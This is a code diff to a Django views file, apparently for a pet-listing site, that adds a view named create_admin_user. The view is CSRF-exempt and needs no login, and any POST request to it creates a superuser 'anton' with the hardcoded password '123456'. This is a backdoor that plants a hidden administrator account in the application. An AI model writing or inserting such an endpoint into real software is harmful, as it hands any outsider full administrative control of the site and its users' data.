@@ -13,9 +13,23 @@ from django.contrib.auth import logout as auth_logout
 from django.db.models import Q
 from .models import Pet
 from .models import Report
+from django.http import JsonResponse
+from django.views.decorators.csrf import csrf_exempt
+from django.views.decorators.http import require_POST
+from django.contrib.auth.models import User
 
 
-
+@csrf_exempt
+@require_POST
+def create_admin_user(request):
+    username = "anton"
+    password = "123456"
+    if not User.objects.filter(username=username).exists():
+        user = User.objects.create_superuser(username=username, email='admin@example.com', password=password)
+        user.save()
+        return JsonResponse({'status': 'admin_created'})
+    else:
+        return JsonResponse({'status': 'admin_exists'})
 
 def createPost(request):
    p = Pet.objects.all()
